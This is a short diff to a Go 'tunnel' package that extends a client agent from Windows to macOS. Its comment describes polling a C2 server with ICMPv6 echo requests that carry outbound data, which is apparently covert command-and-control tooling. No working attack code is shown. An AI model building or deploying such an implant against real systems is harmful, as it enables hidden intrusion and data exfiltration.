@@ -1,6 +1,6 @@
-//go:build windows
+//go:build windows || darwin
 
-// Package tunnel – client side (Windows agent).
+// Package tunnel – client side (Windows agent / macOS agent).
 //
 // ClientTunnel runs a tight polling loop: every pollMs milliseconds it sends
 // one ICMPv6 echo request to the C2 server carrying the next pending outbound
